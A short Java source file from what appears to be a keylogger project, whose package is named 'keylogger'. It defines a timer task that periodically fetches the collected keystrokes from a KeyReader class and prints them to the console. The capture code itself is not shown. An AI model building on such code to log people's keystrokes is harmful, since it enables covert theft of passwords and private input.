package com.mossad.keylogger.timer;

import com.mossad.keylogger.KeyReader;

import java.util.List;
import java.util.TimerTask;

public class WriterTask extends TimerTask {

    private KeyReader keyReader;

    public WriterTask(KeyReader keyReader) {
        this.keyReader = keyReader;
    }

    @Override
    public void run() {
        List<String> keys = keyReader.getCollectedKeys();
        keys.stream().forEach(s -> { System.out.print(s);});
    }
}
